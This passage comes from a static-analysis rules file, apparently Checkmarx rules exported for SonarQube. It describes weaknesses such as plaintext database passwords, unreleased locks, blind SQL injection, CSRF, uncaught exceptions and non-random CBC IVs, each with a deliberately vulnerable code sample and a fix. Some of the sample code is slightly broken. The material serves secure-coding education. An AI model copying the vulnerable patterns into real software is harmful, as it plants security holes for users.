&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Decrypt application password before opening the database connection.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Plaintext Database Password&lt;/h4&gt;&lt;pre&gt;
public Connection createConnection(Properties connectionProperties) {

    string user = connectionProperties.getProperty("user");
    string password = connectionProperties.getProperty("password");
    
    Connection conn = DriverManager.getConnection(CONN_STRING, user, password);
    
    return conn; 
}&lt;/pre&gt;&lt;h4&gt;Encrypted Database Password&lt;/h4&gt;&lt;pre&gt;
public Connection createConnection(Properties connectionProperties) {

    string user = connectionProperties.getProperty("user");
    string password = connectionProperties.getProperty("password");
    
    // Call encryption framework to decrypt password with protected key
    password = decryptPassword(password); 
    
    try { 
        Connection conn = DriverManager.getConnection(CONN_STRING, 
                                                    user, password);
    }
    catch (SQLException e)  {
        handleException(e); 
    }
    
    return conn; 
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_637</key><name>Improper_Locking</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Incomplete management of explicit thread locking can lead to deadlocked threads, wherein one thread (or several) is blocked while waiting for the other thread to release it's lock - which will&amp;#160;never happen, causing the other threads to be disabled indefinitely. This could also cause the application to&amp;#160;consume other resources indefinitely, without releasing them. At the very least, this flaw will severly limit throughput of the application, by blocking the multithreaded operations.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;In order to improve performance and raise throughput, the application has several threads performing operations in parallel. In certain situations, sensitive methods need to ensure that other threads are not interferring with the integrity of their operations or data. To do so, these methods need to acquire a lock (commonly known as mutex, monitor, or other types) to synchronize access between threads.&lt;/div&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;div&gt;However, in this case, the synchronization lock is never unlocked, and can cause the other threads to continuously await its release indefinitely.&amp;#160;&lt;/div&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Always ensure any synchronization locks are explicitly released.&amp;#160;&lt;/li&gt;
&lt;li&gt;In particular, use strucutured error handling to ensure that the locks are released even after runtime exceptions.&amp;#160;&lt;/li&gt;
&lt;li&gt;Avoid manual locking, if&amp;#160;possible, instead using&amp;#160;automatic&amp;#160;locking via&amp;#160;synchronized blocks and methods where available.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Threaded code without releasing the synchronization lock&lt;/h4&gt;&lt;pre&gt;class Improper_Locking 
{
   private final ReentrantLock lock = new ReentrantLock();
   public void m()
   {
     lock.lock();
     DoSomethingSynchronized();
   }
}
    &lt;/pre&gt;&lt;h4&gt;Proper Lock release&lt;/h4&gt;&lt;pre&gt; class Improper_Locking_Fixed
{
   private final ReentrantLock lock = new ReentrantLock();
 
   public void m()
   {
     try
    {
	    lock.lock();
        DoSomethingSynchronized();
    } 
    finally 
    {
        lock.unlock();
    }
  }
}
 
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_598</key><name>Blind_SQL_Injections</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could directly access all of the system's data. Using available tools and text editing, the attacker would be able to steal any sensitive information stored by the system (such as personal user details or credit cards), and possibly change or erase existing data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with its database by sending a textual SQL query. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could contain SQL commands that would be interpreted as such by the database. Even when application error responses do not contain actual database content, available tools can perform series of boolean tests for errors to gradually obtain database content.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Additionally, escape all user input before including it in the query. Escaping should be done relative to the specific database in use.&lt;/li&gt;
&lt;li&gt;Instead of concatenating strings: a. Use secure database components such as stored procedures, parameterized queries, and object bindings (for commands and parameters). b. An even better solution is to use an ORM library, such as EntityFramework, Hibernate, or iBatis.&lt;/li&gt;
&lt;li&gt;Do not allow the user to dynamically provide the name of the queried table, and if possible completely avoid using dynamic table names. 5. Restrict access to database objects and functionality, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Using Parameterized Queries:

      &lt;/h4&gt;&lt;pre&gt;


String custId = txtCustomerId.Text;
if (!Regex.IsMatch(custId, @"^\d{6}\z"))
throw new ArgumentException("Invalid customer Id.");
String query = "SELECT accountBalance FROM customers WHERE customerId = ?";
OleDbCommand command = new OleDbCommand(query, connection);
command.Parameters.Add(new OleDbParameter("customerName", custId));
OleDbDataReader reader = command.ExecuteReader();



      &lt;/pre&gt;&lt;h4&gt;

Using Stored Procedures:

      &lt;/h4&gt;&lt;pre&gt;


String custId = txtCustomerId.Text;
if (!Regex.IsMatch(custId, "^\d{6}\z"))
throw new ArgumentException("Invalid customer Id.");
try {
SqlCommand command = new SqlCommand("getAccountBalance", conn);
command.CommandType = CommandType.StoredProcedure;
command.Parameters.Add(new SqlParameter("@CustomerName", custId));
SqlDataReader reader = command.ExecuteReader();
}
catch (SqlException se) {
// … logging and error handling
}



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Using Parameterized Queries:

      &lt;/h4&gt;&lt;pre&gt;


String custId = request.getParameter("customerId");
Pattern custPattern = Pattern.compile("^\d{6}$");
if ( !custPattern.matcher( custId ).matches() )
throw new ValidationException("Invalid customer Id.");
String query = "SELECT accountBalance FROM customers WHERE customerId = ?";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, custId );
ResultSet results = pstmt.executeQuery( );


      &lt;/pre&gt;&lt;h4&gt;

Using Stored Procedures:

      &lt;/h4&gt;&lt;pre&gt;


String custId = request.getParameter("customerId");
Pattern custPattern = Pattern.compile("^\d{6}$");
if ( !custPattern.matcher( custId ).matches() )
throw new ValidationException("Invalid customer Id.");
try {
CallableStatement cs = conn.prepareCall("{call getAccountBalance(?)}");
cs.setString(1, custname);
ResultSet results = cs.executeQuery();
}
catch (SQLException se) {
// … logging and error handling
}


      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2789</key><name>JSON_Hijacking</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could cause the victim to perform any action for which the victim is authorized, such as transferring funds from the victim&amp;#8217;s account to the attacker&amp;#8217;s. The action will be logged as being performed by the victim.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application performs some action that modifies database contents, based purely on HTTP request content, and does not require per-request renewed authentication (such as transaction authentication or a cryptographic form token), instead relying on browser or session authentication. This means that an attacker could use social engineering to cause a victim to click a link including a transaction request, and the application would trust the victim&amp;#8217;s browser and would perform the action. This type of attack is known as Cross-Site Request Forgery (XSRF or CSRF).&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Implement a standard or library anti-CSRF mechanism: preferably a built-in platform-provided mechanism or OWASP&amp;#8217;s CSRFGuard. Selective re-authentication or transaction authentication, such as with a cryptographic form token, is also acceptable.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
HttpRequest content is used in a database query without any validation of that content
      &lt;/h4&gt;&lt;pre&gt;

public class XSRF
{
        public void foo(SqliteConnection connection, HttpRequest Request)
        {
                string input = Request.QueryString["user"];
                string sql = "insert into Comments(comment) values (@user)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
            	cmd.Parameters.AddwithValue(@user, input);
            	connection.Open();
            	SqlDataReader reader = cmd.ExecuteReader();
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The HttpRequest content is validated using AntiXsrfTokenKey
      &lt;/h4&gt;&lt;pre&gt;

public class XSRFFixed
{
        public void foo(SqliteConnection connection, AntiXsrf AntiXsrfTokenKey, HttpRequest Request)
        {
                string input = AntiXsrfTokenKey.Validate(Request.QueryString["user"]);
                string sql = "insert into Comments(comment) values (@user)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
            	cmd.Parameters.AddwithValue(@user, input);
            	connection.Open();
            	SqlDataReader reader = cmd.ExecuteReader();
        }

}



      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1663</key><name>Uncaught_Exception</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Uncaught Exception&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;248&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_248_Description" id="oc_248_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Failing to catch an exception thrown from a dangerous function
can potentially cause the program to crash.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_248_Time of Introduction" id="oc_248_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_248_Applicable Platforms" id="oc_248_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;C++&lt;/p&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;p&gt;.NET&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_248_Demonstrative Examples" id="oc_248_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The _alloca() function allocates memory on the stack. If an
allocation request is too large for the available stack space, _alloca()
throws an exception. If the exception is not caught, the program will crash,
potentially enabling a denial of service attack. _alloca() has been
deprecated as of Microsoft Visual Studio 2005(R). It has been replaced with
the more secure _alloca_s().&lt;/p&gt;&lt;p class="subheading"&gt;Example 2&lt;/p&gt;&lt;p&gt;EnterCriticalSection() can raise an exception, potentially causing
the program to crash. Under operating systems prior to Windows 2000, the
EnterCriticalSection() function can raise an exception in low memory
situations. If the exception is not caught, the program will crash,
potentially enabling a denial of service attack.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_248_Relationships" id="oc_248_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;227&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=227" target="_blank"&gt;Failure to Fulfill API Contract ('API Abuse')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;389&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=389" target="_blank"&gt;Error Conditions, Return Values, Status Codes&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts&lt;/span&gt;699&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;691&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=691" target="_blank"&gt;Insufficient Control Flow Management&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;703&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=703" target="_blank"&gt;Failure to Handle Exceptional Conditions&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;730&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=730" target="_blank"&gt;OWASP Top Ten 2004 Category A9 - Denial of Service&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_248_Taxonomy Mappings" id="oc_248_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Often Misused: Exception Handling&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_248_Related Attack Patterns" id="oc_248_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org54.html" target="_blank"&gt;54&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Probing an Application Through Targeting its Error Reporting&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_248_Content History" id="oc_248_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-15&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Veracode&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Suggested OWASP Top Ten 2004
mapping&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Removed C from Applicable Platforms&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-01-30&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Often Misused: Exception
Handling&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1581</key><name>Not_Using_a_Random_IV_with_CBC_Mode</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Random values are often used as a mechanism to prevent malicious users from guessing a value, such as a password, encryption key, or session identifier. Depending on what&amp;#160;this random value is used for, an attacker would be able to predict&amp;#160;the next numbers generated, or previously generated values. This could enable the attacker to hijack another user's session, impersonate another user, or crack an encryption key (depending on what&amp;#160;the pseudo-random value was used for).&amp;#160;&lt;/div&gt;      
